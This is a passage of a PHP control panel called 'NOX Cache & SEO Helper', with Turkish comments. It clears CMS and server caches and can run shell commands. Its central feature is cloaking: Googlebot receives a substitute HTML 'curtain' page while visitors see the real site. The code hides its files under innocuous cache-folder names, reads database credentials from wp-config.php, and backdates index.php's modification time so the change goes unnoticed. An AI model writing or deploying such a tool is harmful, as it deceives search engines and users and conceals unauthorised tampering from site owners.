      $res['wp_cache']=['s'=>'na','m'=>'wp-content/cache/ bulunamadı'];
    }
    $pluginDirs=[
      'dir_w3tc'       =>[$DIR.'/wp-content/w3tc-cache/','W3 Total Cache'],
      'dir_wprocket'   =>[$DIR.'/wp-content/wp-rocket-cache/','WP Rocket'],
      'dir_litespeed'  =>[$DIR.'/wp-content/litespeed/','LiteSpeed'],
      'dir_autoptimize'=>[$DIR.'/wp-content/cache/autoptimize/','Autoptimize'],
      'dir_endurance'  =>[$DIR.'/wp-content/endurance-page-cache/','Endurance Page Cache'],
      'dir_wpfastest'  =>[$DIR.'/wp-content/uploads/wp-fastest-cache/','WP Fastest Cache'],
      'dir_comet'      =>[$DIR.'/wp-content/cache/comet-cache/','Comet Cache'],
      'dir_enabler'    =>[$DIR.'/wp-content/cache/cache-enabler/','Cache Enabler'],
    ];
    foreach($pluginDirs as $k=>$_pair){ $pdir=$_pair[0]; $plabel=$_pair[1];
      if(is_dir($pdir)){
        $pcnt=_cc_rmdir($pdir);
        $res[$k]=['s'=>'ok','m'=>"$plabel: $pcnt dosya silindi"];
      }else{
        $res[$k]=['s'=>'na','m'=>"$plabel: dizin bulunamadı"];
      }
    }
  }elseif($CMS_INFO['cms']==='joomla'){
    // 3j. Joomla cache: cache/ + administrator/cache/ + tmp/
    foreach([
      'joomla_cache'      =>[$DIR.'/cache','Joomla site cache'],
      'joomla_admin_cache'=>[$DIR.'/administrator/cache','Joomla admin cache'],
      'joomla_tmp'        =>[$DIR.'/tmp','Joomla tmp/'],
    ] as $k=>$_pair){ $jdir=$_pair[0]; $jlabel=$_pair[1];
      if(is_dir($jdir)){
        $jcnt=_cc_rmdir($jdir);
        $res[$k]=['s'=>'ok','m'=>"$jlabel: $jcnt dosya silindi"];
      }else{
        $res[$k]=['s'=>'na','m'=>"$jlabel: dizin yok"];
      }
    }
    // Joomla CLI (varsa) — cache:clean DB-side cache'i de temizler
    $joomlaCli=$DIR.'/cli/joomla.php';
    if(file_exists($joomlaCli)&&function_exists('shell_exec')){
      $out=trim((string)@shell_exec('php '.escapeshellarg($joomlaCli).' cache:clean 2>&1'));
      $res['joomla_cli']=['s'=>'ok','m'=>$out?:'cache:clean çalıştırıldı'];
    }else{
      $res['joomla_cli']=['s'=>'na','m'=>'Joomla CLI bulunamadı veya shell_exec kapalı'];
    }
  }elseif($CMS_INFO['cms']==='laravel'){
    // 3l. Laravel: bootstrap/cache/*.php + storage/framework/{cache,views}
    $lvRoot=dirname($DIR); // public/ ise bir üst dizin
    // bootstrap/cache/*.php — config.php, packages.php, routes-v7.php, services.php
    $bcDir=$lvRoot.'/bootstrap/cache';
    if(is_dir($bcDir)){
      $bcCnt=0;
      foreach((array)@glob($bcDir.'/*.php') as $bcf){if(@unlink($bcf))$bcCnt++;}
      $res['laravel_bootstrap']=['s'=>'ok','m'=>"bootstrap/cache: $bcCnt php silindi"];
    }else{
      $res['laravel_bootstrap']=['s'=>'na','m'=>'bootstrap/cache dizini yok'];
    }
    // storage/framework/cache/data
    $sfData=$lvRoot.'/storage/framework/cache/data';
    if(is_dir($sfData)){
      $sfCnt=_cc_rmdir($sfData);
      $res['laravel_storage_cache']=['s'=>'ok','m'=>"storage/framework/cache/data: $sfCnt dosya silindi"];
    }else{
      $res['laravel_storage_cache']=['s'=>'na','m'=>'storage/framework/cache/data yok'];
    }
    // storage/framework/views/*.php
    $sfViews=$lvRoot.'/storage/framework/views';
    if(is_dir($sfViews)){
      $vCnt=0;
      foreach((array)@glob($sfViews.'/*.php') as $vf){if(@unlink($vf))$vCnt++;}
      $res['laravel_views']=['s'=>'ok','m'=>"compiled views: $vCnt php silindi"];
    }else{
      $res['laravel_views']=['s'=>'na','m'=>'storage/framework/views yok'];
    }
    // artisan optimize:clear (config+route+view+cache hepsini temizler)
    $artisan=$lvRoot.'/artisan';
    if(file_exists($artisan)&&function_exists('shell_exec')){
      $out=trim((string)@shell_exec('cd '.escapeshellarg($lvRoot).' && php artisan optimize:clear 2>&1'));
      $res['laravel_artisan']=['s'=>'ok','m'=>$out?:'optimize:clear çalıştırıldı'];
    }else{
      $res['laravel_artisan']=['s'=>'na','m'=>'artisan bulunamadı veya shell_exec kapalı'];
    }
  }
  // CMS=generic için ek dizin temizliği yok (zaten OPcache + statcache + Varnish/Nginx/CF aşağıda)

  // 3c. WP plugin disk cache'leri — wp-load.php İNCLUDE EDİLMEZ (ağır eklenti yığını 10dk hang yapıyordu).
  //   Plugin'lerin cache dizinlerini DOSYA SEVİYESİNDE sileriz; wp-load/init hook'u boot etmeye gerek yok.
  if($CMS_INFO['cms']==='wp'){
    $wpExtra=[
      'dir_wpsupercache'=>[$DIR.'/wp-content/cache/supercache/','WP Super Cache'],
      'dir_objectcache' =>[$DIR.'/wp-content/cache/object-cache/','Object Cache'],
      'dir_minify'      =>[$DIR.'/wp-content/cache/minify/','Minify'],
      'dir_sgcache'     =>[$DIR.'/wp-content/cache/siteground-optimizer-assets/','SG Optimizer'],
    ];
    foreach($wpExtra as $k=>$_pair){ $pdir=$_pair[0]; $plabel=$_pair[1];
      if(is_dir($pdir)){$pcnt=_cc_rmdir($pdir);$res[$k]=['s'=>'ok','m'=>"$plabel: $pcnt dosya silindi"];}
    }
  }

  // 4. LiteSpeed Web Server — server-level purge (LSCache plugin OLMASA bile çalışır, plugin'siz/anlık).
  //   X-LiteSpeed-Purge response header'ı → LSWS yakalar, cache'i siler. Hostinger/shared hostların çoğu LSWS.
  $srv=strtolower(isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'');
  if(strpos($srv,'litespeed')!==false||strpos($srv,'lsws')!==false){
    if(!headers_sent()){
      header('X-LiteSpeed-Purge: *',true);
      $res['litespeed_server']=['s'=>'ok','m'=>'X-LiteSpeed-Purge: * gönderildi (sunucu seviyesi)'];
    }else{
      $res['litespeed_server']=['s'=>'na','m'=>'Header zaten gönderilmiş'];
    }
  }

  // 5. Varnish PURGE — SADECE gerçek Varnish portu (6081). :80 = canlı site, ona PURGE atma (risk + yavaş).
  if(function_exists('curl_init')){
    $hhost=$_SERVER['HTTP_HOST'];
    $ch=curl_init("http://127.0.0.1:6081/");
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_CUSTOMREQUEST=>'PURGE',CURLOPT_HTTPHEADER=>["Host: $hhost","X-Purge-Method: default"],CURLOPT_TIMEOUT=>1,CURLOPT_CONNECTTIMEOUT=>1]);
    curl_exec($ch);$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);$cerr=curl_error($ch);curl_close($ch);
    $res['varnish']=(!$cerr&&$code>0)?['s'=>'ok','m'=>"PURGE 6081 → HTTP $code"]:['s'=>'na','m'=>'Varnish yok (port 6081)'];
  }else{$res['varnish']=['s'=>'na','m'=>'cURL yok'];}

  // 5b. Nginx FastCGI Cache — yaygın dizin konumlarını tara
  $nginxFound=false;
  foreach(['/var/cache/nginx/','/tmp/nginx-cache/','/dev/shm/nginx-cache/',$DIR.'/.nginx-cache/'] as $ndir){
    if(is_dir($ndir)&&is_writable($ndir)){
      $ncnt=_cc_rmdir($ndir);
      $res['nginx_cache']=['s'=>'ok','m'=>"Nginx FastCGI Cache: $ncnt dosya silindi ($ndir)"];
      $nginxFound=true;break;
    }
  }
  if(!$nginxFound)$res['nginx_cache']=['s'=>'na','m'=>'Nginx FastCGI Cache dizini bulunamadı'];

  // [v3] LiteSpeed WP-CLI shell_exec + .htaccess tarama + warmup KOMPLE ÇIKARILDI
  //   - WP-CLI shell_exec dakikalarca takılabiliyor (DB connect / hook bekleme)
  //   - htaccess tarama sadece uyarı veriyordu, fonksiyonel etki yok
  //   - warmup 2x10sn boşa bekleme — Googlebot kendi taramasını yapar

  // 6. MANAGED HOST — Kinsta / WP Engine / Pantheon / Flywheel / Cloudways
  //    Bu hostların edge cache'i (KinstaCDN/EverCache/PantheonEdge/FlyCache) PHP'den doğrudan silinemez.
  //    Bilinen mu-plugin fonksiyonları varsa çağır; yoksa kullanıcıya MANUEL DASHBOARD talimatı döndür.
  $mh=function_exists('cseh_detect_managed_host')?cseh_detect_managed_host():array('host'=>null);
  if($mh['host']!==null){
    $mh_msg='';
    if($mh['host']==='wpengine'){
      // WP Engine — WpeCommon::purge_varnish_cache() / purge_memcached() / clear_maxcdn_cache()
      $done=array();
      if(class_exists('WpeCommon')){
        if(method_exists('WpeCommon','purge_varnish_cache')){ try{ @WpeCommon::purge_varnish_cache(); $done[]='varnish'; }catch(Exception $e){} }
        if(method_exists('WpeCommon','purge_memcached'))   { try{ @WpeCommon::purge_memcached();     $done[]='memcached'; }catch(Exception $e){} }
        if(method_exists('WpeCommon','clear_maxcdn_cache')){ try{ @WpeCommon::clear_maxcdn_cache();  $done[]='cdn'; }catch(Exception $e){} }
      }
      // WP Engine — sadece otomatik purge dene, mesaj gösterme
    }elseif($mh['host']==='kinsta'){
      // Kinsta — otomatik purge dene, sessizce geç
      if(class_exists('Kinsta\\Cache') && method_exists('Kinsta\\Cache','purge_complete_caches')){
        try{ $inst=new Kinsta\Cache(); @$inst->purge_complete_caches(); }catch(Exception $e){}
      }
      if(function_exists('do_action'))@do_action('kinsta_cache_purge_all');
    }elseif($mh['host']==='pantheon'){
      if(function_exists('pantheon_clear_edge_all')){
        try{ @pantheon_clear_edge_all(); }catch(Exception $e){}
      }
    }elseif($mh['host']==='cloudways'){
      if(function_exists('do_action'))@do_action('breeze_clear_all_cache');
    }
    // (managed host uyarıları kaldırıldı — sessizce dene, kullanıcıya manuel talimat verme)
  }

  // ★ CLOUDFLARE CACHE PURGE — token varsa OTOMATIK tetiklenir (yeni)
  $res['cloudflare']=cseh_cf_auto_purge($DIR);

  while(ob_get_level()>0)ob_end_clean();
  $out=json_encode($res,JSON_UNESCAPED_UNICODE);
  if($out===false){
    array_walk_recursive($res,function(&$v){if(is_string($v))$v=function_exists('iconv')?(string)@iconv('UTF-8','UTF-8//IGNORE',$v):substr($v,0,500);});
    $out=json_encode($res,JSON_UNESCAPED_UNICODE);
    if($out===false)$out='{"fatal":"json_encode_fail"}';
  }
  header("Content-Type:application/json");
  echo $out;exit;
}

// ---- Timestamp maskeleme ---------------------------------------------------
if($a==="fixtimestamp"){
  // Maskeleyeceğimiz dosya = sadece kök index.php (perde/backup artık gizli .render-cache/ alt klasöründe)
  $maskFiles=[$INDEX_FILE];
  $skip=array_merge([basename(__FILE__)],$maskFiles);
  $refMt=ref_mtime($DIR,$skip);
  $res=[];
  if(!$refMt){
    $res['ref']=['s'=>'warn','m'=>'Dizinde referans dosya bulunamadı'];
    header("Content-Type:application/json");echo json_encode($res,JSON_UNESCAPED_UNICODE);exit;
  }
  $res['ref']=['s'=>'ok','m'=>'Referans tarih: '.date('d.m.Y H:i',$refMt).' ('.$CMS_INFO['label'].')'];
  foreach($maskFiles as $mf){
    $fp=$DIR.DIRECTORY_SEPARATOR.$mf;
    if(!file_exists($fp)){$res[$mf]=['s'=>'na','m'=>'Dosya yok'];continue;}
    $old=@filemtime($fp);
    $ok=@touch($fp,$refMt);
    $res[$mf]=['s'=>$ok?'ok':'err','m'=>date('d.m.Y H:i',$old).' → '.date('d.m.Y H:i',$refMt)];
  }
  header("Content-Type:application/json");echo json_encode($res,JSON_UNESCAPED_UNICODE);exit;
}

if($a==="info"){
  $bak=$BACKUP_PATH;
  $perde=$PERDE_PATH;
  // Hangi imzalar yakalandı?
  $sig=[];
  if(file_exists($DIR.'/wp-config.php'))    $sig[]='wp-config.php';
  if(file_exists($DIR.'/wp-load.php'))      $sig[]='wp-load.php';
  if(is_dir($DIR.'/wp-includes'))           $sig[]='wp-includes/';
  if(file_exists($DIR.'/configuration.php'))$sig[]='configuration.php';
  if(is_dir($DIR.'/administrator'))         $sig[]='administrator/';
  if(file_exists($DIR.'/../bootstrap/app.php'))$sig[]='../bootstrap/app.php';
  if(file_exists($DIR.'/../artisan'))       $sig[]='../artisan';
  echo "<pre style='background:#0a1228;color:#0ff;padding:14px;border:1px solid #0f3;font-family:monospace;font-size:12px;line-height:1.6'>";
  echo "PHP        : ".PHP_VERSION."\n";
  echo "Uname      : ".php_uname()."\n";
  echo "SAPI       : ".php_sapi_name()."\n";
  echo "DocRoot    : ".$DIR."\n";
  echo "\n--- NOX CMS Tespiti ---\n";
  echo "CMS        : <b style='color:#0f0'>".$CMS_INFO['label']."</b> (cms=".$CMS_INFO['cms'].")\n";
  echo "Sinyaller  : ".($sig?implode(', ',$sig):'<i style=color:#f55>hiçbiri</i>')."\n";
  echo "Perde HTML : ".$HTML_FILE.(file_exists($perde)?' <span style=color:#0f0>(var, '.number_format(@filesize($perde))." B)</span>":' <span style=color:#fa0>(yok)</span>')."\n";
  $_bakSize=file_exists($bak)?(int)@filesize($bak):0;
  echo "Backup     : ".basename($bak).($_bakSize>0?' <span style=color:'.($_bakSize<200?'#fa0':'#0f0').'>(var, '.number_format($_bakSize)." B".($_bakSize<200?' — BOZUK, Cloak Aç → otomatik onarılır':'').')</span>':' <span style=color:#888>(yok — henüz cloak atılmamış)</span>')."\n";
  // ★ Cache plugin bypass durumu (WP + DB erişim varsa)
  if(file_exists($DIR.'/wp-config.php')||file_exists(dirname($DIR).'/wp-config.php')){
    $_cb=@cseh_apply_cache_bypass($DIR);
    if($_cb['status']==='done' && !empty($_cb['detected'])){
      $_ok=0; foreach($_cb['results'] as $_r){ if(!empty($_r['ok'])) $_ok++; }
      echo "Cache Plugin: <span style=color:#0f0>".implode(', ',$_cb['detected'])." ✓ bypass aktif ($_ok/".count($_cb['results']).")</span>\n";
    }elseif($_cb['status']==='no_cache_plugin'){
      echo "Cache Plugin: <span style=color:#888>yok (bypass gerekmez)</span>\n";
    }elseif($_cb['status']==='db_connect_failed'){
      echo "Cache Plugin: <span style=color:#fa0>DB bağlantı kurulamadı (cache plugin varsa manuel ayar gerek)</span>\n";
    }elseif($_cb['status']==='no_creds'){
      echo "Cache Plugin: <span style=color:#fa0>wp-config.php DB credentials okunamadı</span>\n";
    }
  }
  // ★ Sürüm + dosya MD5 (yanlış sürüm yüklemesini hızlıca tespit et)
  $_self=__FILE__; $_md5=@md5_file($_self); $_size=@filesize($_self);
  echo "Sürüm      : <b>v0.4-managed-host</b>  |  MD5: <code>".substr($_md5,0,12)."</code>  |  ".number_format((int)$_size)." B\n";
  // OPcache var mı, ne kadar dolu?
  if(function_exists('opcache_get_status')){
    $os=@opcache_get_status(false);
    if($os){
      $used=isset($os['memory_usage']['used_memory'])?round($os['memory_usage']['used_memory']/1048576,1):'?';
      $free=isset($os['memory_usage']['free_memory'])?round($os['memory_usage']['free_memory']/1048576,1):'?';
      $scripts=isset($os['opcache_statistics']['num_cached_scripts'])?$os['opcache_statistics']['num_cached_scripts']:'?';
      echo "\n--- OPcache ---\n";
      echo "Bellek     : ${used} MB kullanılan / ${free} MB boş\n";
      echo "Script     : ${scripts} script cache'lenmiş\n";
    }
  }
  echo "</pre>";
  exit;
}

header('Content-Type: text/html; charset=utf-8');
// Panel ASLA cache'lenmesin → token her zaman güncel (eski token'lı cache → AJAX 404 sorununu önler)
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

// ---- Durum bilgisi ----------------------------------------------------------
$idxPath=$DIR.DIRECTORY_SEPARATOR.$INDEX_FILE;
$htmlPath=$DIR.DIRECTORY_SEPARATOR.$HTML_FILE;
$idxExists=file_exists($idxPath);
$htmlExists=file_exists($htmlPath);
$idxSize=$idxExists?number_format(@filesize($idxPath)):'—';
$htmlSize=$htmlExists?number_format(@filesize($htmlPath)):'—';
$googleFiles=list_google_files($DIR);
// Plugin context (WP route ?cseh=1) → linklere cseh=1 prefix gerek, yoksa kaybolur
// Erişim anahtarı: plugin modunda wrapper CSEH_KEY define eder (sabit ?wpmc=1). Standalone'da prefix yok.
$cseh_key=defined('CSEH_KEY')?CSEH_KEY:'wpmc';
// Prefix mantığı: istek ?wpmc=1 ile mi geldi? (plugin VEYA file-mode index.php panel-kapısı).
// Doğrudan cache-seo-helper.php erişiminde param yok → prefix yok. Bu, AJAX'ın param'ı düşürmesini önler.
$_via_param=(isset($_GET[$cseh_key])&&$_GET[$cseh_key]==='1');
$pk=($_via_param?$cseh_key.'=1&':'').'p='.rawurlencode($_np);
?><!DOCTYPE html><html lang="tr"><head><meta charset="utf-8">
<title><?=htmlspecialchars($_SERVER['HTTP_HOST'])?></title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}
body{background:#1a1a2e;color:#0ff;font-family:monospace;padding:24px;margin:0;max-width:820px;margin:0 auto}
h1{color:#0f0;margin:0 0 4px;font-size:20px}
.sub{color:#555;font-size:12px;margin-bottom:20px}
a{color:#0f0}
.card{border:1px solid #0f3;border-radius:6px;padding:16px;margin:12px 0;background:#16213e}
.card h3{color:#0f3;margin:0 0 12px;font-size:14px;text-transform:uppercase;letter-spacing:.08em}
.status-row{display:flex;align-items:center;gap:10px;margin:6px 0;font-size:13px}
.dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
.dot.ok{background:#0f0}
.dot.warn{background:#fa0}
.dot.err{background:#c33}
.file-label{color:#0ff;min-width:240px}
.file-size{color:#555;font-size:11px}
.btn{cursor:pointer;font-weight:bold;padding:9px 18px;border:none;font-family:monospace;font-size:13px;border-radius:4px;transition:opacity .15s}
.btn:hover{opacity:.85}
.btn:active{opacity:.65}
.btn-row{display:flex;gap:8px;margin:8px 0;flex-wrap:wrap}
.btn-row .btn{flex:1;min-width:160px}
.btn-cloak{background:#0a2e10;color:#0f3;border:1px solid #0a9}
.btn-revert{background:#2e1800;color:#fa0;border:1px solid #c80}
.btn-cache{background:#1a4a4a;color:#0ff;border:1px solid #0cc}
.cache-row{display:flex;align-items:center;gap:8px;padding:5px 8px;border-radius:3px;font-size:12px;margin:3px 0}
.cache-ok{background:#0a1e0a;border-left:3px solid #0f0;color:#0f0}
.cache-err{background:#1e0a0a;border-left:3px solid #f55;color:#f55}
.cache-warn{background:#1e180a;border-left:3px solid #fa0;color:#fa0}
.cache-na{background:#111;border-left:3px solid #444;color:#555}
.btn-save{background:#08c;color:#fff}
.btn-load{background:#333;color:#0f0}
.msg{margin-top:10px;font-size:13px;min-height:18px}
.msg.ok{color:#0f0}
.msg.err{color:#f55}
.msg.info{color:#0ff}
textarea{background:#0a1228;color:#0ff;border:1px solid #0f3;padding:8px;font-family:monospace;font-size:12px;width:100%;height:150px;border-radius:4px;resize:vertical}
.toolbar{display:flex;gap:8px;margin:8px 0;flex-wrap:wrap;align-items:center}
.note{color:#666;font-size:11px;margin:6px 0}
details>summary{cursor:pointer;color:#0f0;font-size:13px;padding:6px 0;user-select:none}
details>summary:hover{color:#0ff}
.tag{display:inline-block;padding:1px 7px;border-radius:3px;font-size:11px;margin-left:6px}
.tag-cloak{background:#0f3;color:#000}
.tag-orig{background:#fa0;color:#000}
.btn-check{background:#0a1a3a;color:#4af;border:1px solid #38c}
.btn-ts{background:#2a1a4a;color:#c8a0ff;border:1px solid #7755cc}
.badge-ok{background:#0a2e0a;border:1px solid #0f0;color:#0f0}
.badge-fail{background:#2e0a0a;border:1px solid #f55;color:#f55}
.badge-warn{background:#2e240a;border:1px solid #fa0;color:#fa0}
hr{border:none;border-top:1px solid #222;margin:20px 0}
.cloak-status{display:inline-flex;align-items:center;gap:6px;padding:5px 12px;border-radius:4px;font-size:12px;font-weight:bold;font-family:monospace;white-space:nowrap}
.cloak-status.cs-checking{background:#0a1228;border:1px solid #0cc;color:#0cc}
.cloak-status.cs-aktif{background:#0a2e0a;border:1px solid #0f0;color:#0f0}
.cloak-status.cs-sorun{background:#2e1a0a;border:1px solid #fa0;color:#fa0}
.cloak-status.cs-pasif{background:#1a1a1a;border:1px solid #555;color:#555}
.btn-cache-off{opacity:.38;cursor:not-allowed !important}
.cache-hint{font-size:12px;padding:9px 12px;border-radius:4px;margin-top:8px;line-height:1.6}
.cache-hint.ch-info{background:#0a1e2a;border-left:3px solid #0cc;color:#0cc}
.cache-hint.ch-warn{background:#1e180a;border-left:3px solid #fa0;color:#fa0}
</style>
</head><body>

<div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:4px">
  <h1 style="margin:0;display:flex;align-items:center;gap:10px">
    <span style="display:inline-flex;align-items:center;justify-content:center;width:38px;height:38px;border-radius:9px;background:linear-gradient(135deg,#0f3,#0a7);color:#001b0c;font-weight:900;font-size:18px;font-family:monospace;letter-spacing:-1px;box-shadow:0 0 14px rgba(0,255,90,.35)">NX</span>
    <span style="font-family:monospace;letter-spacing:1px">NOX <span style="color:#0a7;font-weight:400;font-size:15px">// Cache &amp; SEO Helper</span></span>
  </h1>
  <span id="cloak-status" class="cloak-status cs-checking">● Kontrol ediliyor...</span>
</div>
<div class="sub">NOX Engine · <?=htmlspecialchars($DIR)?> &nbsp;|&nbsp; <a href="?<?=$pk?>&a=info">PHP Info</a></div>

<?php
$bakPath=$BACKUP_PATH; // file mode: .render-cache/index.php.nox-backup
$bakExists=file_exists($bakPath);
$_cbMap=['wp'=>'#08c','joomla'=>'#f50','laravel'=>'#e74','generic'=>'#888'];$cmsBadge=isset($_cbMap[$CMS_INFO['cms']])?$_cbMap[$CMS_INFO['cms']]:'#888';
// Plugin modunda perde konumu uploads/wp-media-cache; file modunda kök
$perdeExists=file_exists($PERDE_PATH);
$perdeSize=$perdeExists?number_format(@filesize($PERDE_PATH)):'—';
$perdeLabel=$IS_PLUGIN?'render-cache.html (uploads/wp-media-cache)':'render-cache.html (.render-cache/)';
$cloakOn=($FLAG_PATH&&file_exists($FLAG_PATH)); // her iki mod: bayrak = aç/kapat
$installed=$IS_PLUGIN?true:$INDEX_CLOAKED;
?>

<!-- Durum kartı -->
<div class="card">
  <h3>Durum</h3>
  <?php $_panelMd5=@md5_file(__FILE__); $_panelSize=@filesize(__FILE__); ?>
  <div class="status-row" style="border-bottom:1px solid #2a2a2a;padding-bottom:6px;margin-bottom:6px">
    <span class="dot ok"></span>
    <span class="file-label">Sürüm</span>
    <span class="tag" style="background:#0a7;color:#fff;font-size:11px;padding:2px 8px">v0.4-managed-host</span>
    <span class="tag" style="background:#444;color:#0f0;font-family:monospace;font-size:10px;padding:2px 6px;margin-left:6px">MD5: <?=substr((string)$_panelMd5,0,12)?></span>
    <span class="tag" style="background:#333;color:#aaa;font-size:10px;padding:2px 6px;margin-left:6px"><?=number_format((int)$_panelSize)?> B</span>
  </div>
  <div class="status-row">
    <span class="dot ok"></span>
    <span class="file-label">CMS</span>
    <span class="tag" style="background:<?=$cmsBadge?>;color:#fff;font-size:11px;padding:2px 8px"><?=htmlspecialchars($CMS_INFO['label'])?></span>
    <span class="tag" style="background:<?=$IS_PLUGIN?'#0a7':'#555'?>;color:#fff;font-size:11px;padding:2px 8px;margin-left:6px"><?=$IS_PLUGIN?'PLUGIN-SERVE':'FILE'?></span>
  </div>
  <!-- Cloak servisi durumu — her iki modda bayrağa bağlı -->
  <div class="status-row">
    <span class="dot <?=$cloakOn?'ok':'warn'?>"></span>
    <span class="file-label">Cloak servisi</span>
    <span class="file-size"><?=$cloakOn?'<b style="color:#0f0">AÇIK</b> — Googlebot perdeyi alır':($installed?'<b style="color:#fa0">KAPALI</b> (kurulu, açmak için CLOAK SERVİSİNİ AÇ)':'<b style="color:#888">HENÜZ KURULMADI</b> (CLOAK SERVİSİNİ AÇ)')?></span>
  </div>
  <div class="status-row">
    <span class="dot <?=$perdeExists?'ok':'warn'?>"></span>
    <span class="file-label">render-cache.html</span>
    <span class="file-size"><?=$perdeExists?"$perdeSize bayt".($IS_PLUGIN?' (uploads/wp-media-cache)':' (.render-cache/)'):'— mevcut değil (açınca oluşur) —'?></span>
  </div>
  <?php if(!$IS_PLUGIN && $bakExists): ?>
  <div class="status-row">
    <span class="dot ok"></span>
    <span class="file-label"><?=htmlspecialchars($BACKUP_FILE)?></span>
    <span class="file-size"><?=number_format(@filesize($bakPath))?> bayt &nbsp;<span style="color:#0f0">(orijinal yedek)</span></span>
  </div>
  <?php endif; ?>
<?php foreach($googleFiles as $gf):
  $gfPath=$DIR.DIRECTORY_SEPARATOR.$gf;
  $gfSize=number_format(@filesize($gfPath));
?>
  <div class="status-row">
    <span class="dot ok"></span>
    <span class="file-label"><?=htmlspecialchars($gf)?></span>
    <span class="file-size"><?=$gfSize?> bayt</span>
    <span class="tag" style="background:#08c;color:#fff;font-size:11px;padding:2px 6px;margin-left:4px">GOOGLE</span>
    <a href="#" onclick="removeFile('<?=htmlspecialchars(addslashes($gf))?>');return false" style="color:#f66;font-size:11px;margin-left:6px">Sil</a>
  </div>
<?php endforeach; ?>
</div>

<!-- Ana buton -->
<div class="card">
  <h3>Cloak İşlemleri</h3>

  <div class="btn-row">
    <button class="btn" style="background:#0a2a3a;color:#0cf;border:1px solid #0af;font-weight:bold" onclick="precheck()">Ön Uyumluluk Testi</button>
    <button class="btn btn-cloak" onclick="autocloak()">CLOAK SERVİSİNİ AÇ</button>
    <button class="btn btn-check" onclick="botcheck()">GoogleBot ile Kontrol Et</button>
    <button class="btn" style="background:#2a1a3a;color:#c9f;border:1px solid #93f" onclick="gscRichTest()">Zengin Sonuçlar Testi ↗</button>
  </div>
  <div style="background:#0a2e10;border:2px solid #0f3;padding:12px;margin:10px 0;border-radius:4px">
    <div style="color:#0f3;font-size:14px;font-weight:bold;margin-bottom:6px;font-family:monospace">★ ZORUNLU SIRA — 1-2-3 SONRA TEST ★</div>
    <div style="color:#cfc;font-size:13px;line-height:1.7">
      <b style="color:#fa0">1.</b> Aşağıdaki <b>PERDE İÇERİĞİ</b> kutusuna marka HTML'i yapıştır → <b>KAYDET</b> bas<br>
      <b style="color:#fa0">2.</b> Yukarıdaki <b style="color:#0f3">CLOAK SERVİSİNİ AÇ</b> bas (perde dolu değilse açılmaz, sırayı zorlar)<br>
      <b style="color:#fa0">3.</b> GSC URL Inspection → Test Live URL → perdeyi gör
    </div>
  </div>
  <div class="btn-row" style="margin-top:12px">
    <button class="btn btn-revert" onclick="revert()">Cloak'ı Kapat</button>
    <button class="btn btn-cache" id="btn-cache" onclick="clearcache()">Cache Temizle</button>
    <?php if(!$IS_PLUGIN): ?>
    <button class="btn btn-ts" onclick="fixtimestamp()">Timestamp Düzelt</button>
    <button class="btn" style="background:#1a0a0a;color:#f66;border:1px solid #c33" onclick="uninstall()">Tamamen Kaldır</button>
    <?php endif; ?>
  </div>
  <?php $srv=cseh_server_type(); ?>
  <div class="note" style="color:#666;margin-top:8px;font-size:11px">Sunucu: <?=htmlspecialchars(strtoupper($srv))?> · Mod: <?=$IS_PLUGIN?'PLUGIN':'FILE'?></div>
  <?php if($srv==='nginx'): ?>
  <details style="margin-top:6px">
    <summary style="color:#fa0">nginx FastCGI cache bypass snippet (sadece server-level cache varsa gerekir)</summary>
    <div class="note" style="margin:6px 0">Bu siteyi nginx server-level cache'liyorsa, hosting/sunucu yöneticisine şu satırları nginx server bloğuna eklet. Cloak zaten PHP'ye ulaşan isteklerde perdeyi basıyor; bu snippet sadece nginx'in Googlebot'u cache'ten serbest bırakması içindir.</div>
    <textarea readonly style="height:150px;color:#adf"><?=htmlspecialchars(cseh_nginx_snippet())?></textarea>
  </details>
  <?php endif; ?>

  <div id="cache-hint" style="display:none" class="cache-hint ch-info"></div>

  <div class="msg" id="cmsg"></div>

  <div id="tsresult" style="display:none;margin-top:10px">
    <div style="color:#c8a0ff;font-size:12px;margin-bottom:6px;font-weight:bold">Timestamp Raporu</div>
    <div id="tsrows"></div>
  </div>

  <div class="msg" id="bcmsg"></div>
  <div id="bcresult" style="display:none;margin-top:10px">
    <div id="bcbadge" style="padding:10px 14px;border-radius:4px;font-size:13px;font-weight:bold;margin-bottom:8px"></div>
    <div id="bcmeta" style="font-size:12px;color:#888;margin-bottom:6px"></div>
    <details>
      <summary style="font-size:12px;color:#555;cursor:pointer">Yanıt önizlemesi (ham HTML)</summary>
      <pre id="bcpreview" style="background:#0a1228;border:1px solid #222;padding:8px;font-size:11px;color:#adf;overflow-x:auto;white-space:pre-wrap;margin:6px 0;max-height:260px;overflow-y:auto"></pre>
    </details>
  </div>
</div>


<!-- Perde Yönetimi — ana: textarea yapıştır (hep çalışır); alta opsiyonel dosya yükle -->
<div class="card">
  <h3>Perde İçeriği</h3>
  <div class="note" style="color:#666;margin-bottom:6px;font-size:11px">Hedef: <code><?=htmlspecialchars($perdeLabel)?></code></div>
  <span id="lmsg" style="font-size:12px;color:#555;display:none"></span>
  <textarea id="htmlcontent" placeholder="Perde HTML kodunu buraya yapıştırın, sonra Kaydet'e basın..."></textarea>
  <div class="toolbar">
    <button class="btn btn-save" onclick="saveHtml()">Kaydet</button>
    <span class="msg" id="hmsg"></span>
  </div>
</div>

<!-- Google doğrulama yükleme -->
<details>
  <summary>Google Search Console Doğrulama Dosyası Yükle</summary>
  <div class="card" style="margin-top:6px">
    <div class="note" style="margin-bottom:8px">Google'ın verdiği <code>google….html</code> dosya adı + <code>google-site-verification:</code> içeriği. Kök'e yazılır.</div>
    <input id="gname" placeholder="Dosya adı: google….html" style="background:#0a1228;color:#0ff;border:1px solid #0f3;padding:7px;font-family:monospace;width:100%;border-radius:4px;margin-bottom:6px">
    <input id="gcontent" placeholder="İçerik: google-site-verification: TOKEN" style="background:#0a1228;color:#0ff;border:1px solid #0f3;padding:7px;font-family:monospace;width:100%;border-radius:4px">
    <div class="toolbar" style="margin-top:8px">
      <button class="btn btn-save" onclick="uploadGoogle()">Yükle</button>
      <span class="msg" id="gmsg"></span>
    </div>
  </div>
</details>

<script>
<?php
// Plugin context (WP route ?cseh=1) → relative AJAX URL'leri cseh=1'i kaybeder, prefix gerek.
